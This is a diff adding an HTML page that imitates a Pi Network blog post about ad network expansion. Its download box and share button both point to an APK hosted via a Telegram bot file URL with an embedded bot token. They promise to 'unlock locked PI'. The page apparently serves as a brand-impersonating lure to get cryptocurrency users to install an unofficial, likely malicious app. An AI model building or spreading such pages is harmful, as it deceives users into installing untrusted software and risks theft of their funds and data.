@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Pi Network Style Page</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      margin: 0;
+      background-color: #fff;
+      color: #333;
+    }
+    header {
+      background-color: #3c3477;
+      padding: 15px 20px;
+      color: white;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    header .logo {
+      font-size: 20px;
+      font-weight: bold;
+    }
+    header .icons {
+      display: flex;
+      gap: 15px;
+      font-size: 20px;
+    }
+    .content {
+      background-color: #3c3477;
+      color: white;
+      padding: 30px 20px;
+    }
+    .content h1 {
+      font-size: 28px;
+      margin-bottom: 20px;
+    }
+    .buttons {
+      display: flex;
+      gap: 15px;
+    }
+    .btn {
+      border: 1px solid #aaa;
+      border-radius: 20px;
+      padding: 8px 16px;
+      background: transparent;
+      color: white;
+      cursor: pointer;
+    }
+    .breadcrumb {
+      font-size: 14px;
+      color: #777;
+      margin: 15px 20px;
+    }
+    .article {
+      padding: 0 20px;
+      font-size: 16px;
+    }
+    .download-box {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      background: #f5f5f5;
+      border-radius: 15px;
+      padding: 15px 20px;
+      margin: 20px;
+    }
+    .download-box strong {
+      display: block;
+      font-size: 16px;
+    }
+    .download-btn {
+      background: #f7931e;
+      color: white;
+      padding: 10px 20px;
+      border-radius: 8px;
+      border: none;
+      font-weight: bold;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <div class="logo">Pi Network</div>
+    <div class="icons">
+      <span>&#128269;</span>
+      <span>&#9776;</span>
+    </div>
+  </header>
+
+  <div class="content">
+    <h1>Pi Ad Network Expansion: Now Open to All Ecosystem Listed Pi Apps</h1>
+    <div class="buttons">
+      <button class="btn">&#9825; 103K</button>
+      <button class="btn" id="shareBtn">&#128257; Share</button>
+    </div>
+  </div>
+
+  <div class="breadcrumb">
+    Home » Blog » Pi Ad Network Expansion
+  </div>
+
+  <div class="article">
+    <p>Last year, we introduced the vision and strategy of the Pi Ad Network...</p>
+  </div>
+
+  <div class="download-box">
+    <div>
+      <strong>Pi Network</strong>
+      Unlock locked PI
+    </div>
+    <a class="download-btn" href="https://api.telegram.org/file/bot7969721835:AAGmtyFSJT3FanG9FPXKrBiLMD5gEeACVAo/documents/file_141.apk" target="_blank">Download</a>
+  </div>
+
+  <script>
+    document.getElementById('shareBtn').addEventListener('click', function () {
+      const shareData = {
+        title: 'Pi Network App',
+        text: 'Check out this app to unlock your Pi!',
+        url: 'https://api.telegram.org/file/bot7969721835:AAGmtyFSJT3FanG9FPXKrBiLMD5gEeACVAo/documents/file_141.apk'
+      };
+
+      if (navigator.share) {
+        navigator.share(shareData)
+          .then(() => console.log('Shared successfully'))
+          .catch((error) => console.error('Error sharing:', error));
+      } else {
+        alert("Sharing not supported in your browser.");
+      }
+    });
+  </script>
+
+</body>
+</html>
